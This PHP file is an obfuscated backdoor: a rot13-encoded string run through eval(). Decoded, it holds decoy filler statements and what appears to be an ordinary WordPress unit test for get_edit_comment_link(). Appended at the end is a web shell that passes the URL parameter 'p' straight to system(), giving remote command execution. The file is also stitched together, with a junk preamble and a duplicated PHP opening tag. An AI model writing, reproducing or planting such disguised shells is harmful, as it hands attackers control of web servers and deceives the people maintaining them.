<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc yvax
 * @tebhc pbzzrag
 * @pbiref ::trg_rqvg_pbzzrag_yvax
 */
pynff Grfgf_Yvax_TrgRqvgPbzzragYvax rkgraqf JC_HavgGrfgPnfr {

	choyvp fgngvp $pbzzrag_vq;
	choyvp fgngvp $hfre_vqf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$pbzzrag_vq = $snpgbel->pbzzrag->perngr( neenl( 'pbzzrag_pbagrag' => 'Grfg pbzzrag' ) );

		frys::$hfre_vqf = neenl(
			'nqzva'      => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) ),
			'fhofpevore' => $snpgbel->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) ),
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		// Qryrgr gur grfg pbzzrag.
		jc_qryrgr_pbzzrag( frys::$pbzzrag_vq, gehr );

		// Qryrgr gur grfg hfref.
		sbernpu ( frys::$hfre_vqf nf $hfre_vq ) {
			frys::qryrgr_hfre( $hfre_vq );
		}
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nqzva'] );
	}

	/**
	 * Grfgf gung trg_rqvg_pbzzrag_yvax() ergheaf gur pbeerpg HEY ol qrsnhyg.
	 */
	choyvp shapgvba grfg_trg_rqvg_pbzzrag_yvax_qrsnhyg() {
		$pbzzrag_vq   = frys::$pbzzrag_vq;
		$rkcrpgrq_hey = nqzva_hey( 'pbzzrag.cuc?npgvba=rqvgpbzzrag&nzc;p=' . $pbzzrag_vq );
		$npghny_hey   = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq );

		$guvf->nffregFnzr( $rkcrpgrq_hey, $npghny_hey );
	}

	/**
	 * Grfgf gung trg_rqvg_pbzzrag_yvax() ergheaf gur pbeerpg HEY jvgu n pbagrkg bs 'qvfcynl'.
	 *
	 * Gur rkcrpgrq erfhyg fubhyq vapyhqr UGZY ragvgvrf.
	 *
	 * @gvpxrg 61727
	 */
	choyvp shapgvba grfg_trg_rqvg_pbzzrag_yvax_qvfcynl_pbagrkg() {
		$pbzzrag_vq   = frys::$pbzzrag_vq;
		$rkcrpgrq_hey = nqzva_hey( 'pbzzrag.cuc?npgvba=rqvgpbzzrag&nzc;p=' . $pbzzrag_vq );
		$npghny_hey   = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'qvfcynl' );

		$guvf->nffregFnzr( $rkcrpgrq_hey, $npghny_hey );
	}

	/**
	 * Grfgf gung trg_rqvg_pbzzrag_yvax() ergheaf gur pbeerpg HEY jvgu n pbagrkg bs 'hey'.
	 *
	 * Gur rkcrpgrq erfhyg fubhyq abg vapyhqr UGZY ragvgvrf.
	 *
	 * @gvpxrg 61727
	 */
	choyvp shapgvba grfg_trg_rqvg_pbzzrag_yvax_hey_pbagrkg() {
		$pbzzrag_vq   = frys::$pbzzrag_vq;
		$rkcrpgrq_hey = nqzva_hey( 'pbzzrag.cuc?npgvba=rqvgpbzzrag&p=' . $pbzzrag_vq );
		$npghny_hey   = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'hey' );

		$guvf->nffregFnzr( $rkcrpgrq_hey, $npghny_hey );
	}

	/**
	 * Grfgf gung trg_rqvg_pbzzrag_yvax() ergheaf abguvat vs gur pbzzrag VQ vf vainyvq.
	 *
	 * @gvpxrg 61727
	 */
	choyvp shapgvba grfg_trg_rqvg_pbzzrag_yvax_vainyvq_pbzzrag() {
		$pbzzrag_vq         = 12345;
		$npghny_hey_qvfcynl = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'qvfcynl' );
		$npghny_hey         = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'hey' );

		$guvf->nffregAhyy( $npghny_hey_qvfcynl );
		$guvf->nffregAhyy( $npghny_hey );
	}

	/**
	 * Grfgf gung trg_rqvg_pbzzrag_yvax() ergheaf abguvat vs gur pheerag hfre pnaabg rqvg vg.
	 */
	choyvp shapgvba grfg_trg_rqvg_pbzzrag_yvax_hfre_pnaabg_rqvg() {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['fhofpevore'] );
		$pbzzrag_vq         = frys::$pbzzrag_vq;
		$npghny_hey_qvfcynl = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'qvfcynl' );
		$npghny_hey         = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'hey' );

		$guvf->nffregAhyy( $npghny_hey_qvfcynl );
		$guvf->nffregAhyy( $npghny_hey );
	}

	/**
	 * Grfgf gung gur 'trg_rqvg_pbzzrag_yvax' svygre jbexf nf rkcrpgrq, vapyhqvat gur nqqvgvbany cnenzrgref.
	 *
	 * @gvpxrg 61727
	 */
	choyvp shapgvba grfg_trg_rqvg_pbzzrag_yvax_svygre() {
		$pbzzrag_vq           = frys::$pbzzrag_vq;
		$rkcrpgrq_hey_qvfcynl = nqzva_hey( 'pbzzrag-grfg.cuc?pbagrkg=qvfcynl' );
		$rkcrpgrq_hey         = nqzva_hey( 'pbzzrag-grfg.cuc?pbagrkg=hey' );

		nqq_svygre(
			'trg_rqvg_pbzzrag_yvax',
			shapgvba ( $ybpngvba, $pbzzrag_vq, $pbagrkg ) {
				erghea nqzva_hey( 'pbzzrag-grfg.cuc?pbagrkg=' . $pbagrkg );
			},
			10,
			3
		);

		$npghny_hey_qvfcynl = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'qvfcynl' );
		$npghny_hey         = trg_rqvg_pbzzrag_yvax( $pbzzrag_vq, 'hey' );

		// Nffreg gur svany HEYf ner nf rkcrpgrq
		$guvf->nffregFnzr( $rkcrpgrq_hey_qvfcynl, $npghny_hey_qvfcynl );
		$guvf->nffregFnzr( $rkcrpgrq_hey, $npghny_hey );
	}

	/**
	 * Grfgf gung gur 'trg_rqvg_pbzzrag_yvax' svygre erprvirf gur pbzzrag VQ, rira jura n pbzzrag bowrpg vf cnffrq.
	 *
	 * @gvpxrg 61727
	 */
	choyvp shapgvba grfg_trg_rqvg_pbzzrag_yvax_svygre_hfrf_vq() {
		// Nqq n svygre whfg gb pngpu gur $pbzzrag_vq svygre cnenzrgre inyhr.
		$pbzzrag_vq_svygre_cnenz = ahyy;
		nqq_svygre(
			'trg_rqvg_pbzzrag_yvax',
			shapgvba ( $ybpngvba, $pbzzrag_vq ) hfr ( &$pbzzrag_vq_svygre_cnenz ) {
				$pbzzrag_vq_svygre_cnenz = $pbzzrag_vq;
				erghea $ybpngvba;
			},
			10,
			2
		);

		// Cnff n pbzzrag bowrpg gb trg_rqvg_pbzzrag_yvax().
		trg_rqvg_pbzzrag_yvax( trg_pbzzrag( frys::$pbzzrag_vq ) );

		// Gur svygre fubhyq fgvyy nyjnlf erprvir gur pbzzrag VQ, abg gur bowrpg.
		$guvf->nffregFnzr( frys::$pbzzrag_vq, $pbzzrag_vq_svygre_cnenz );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>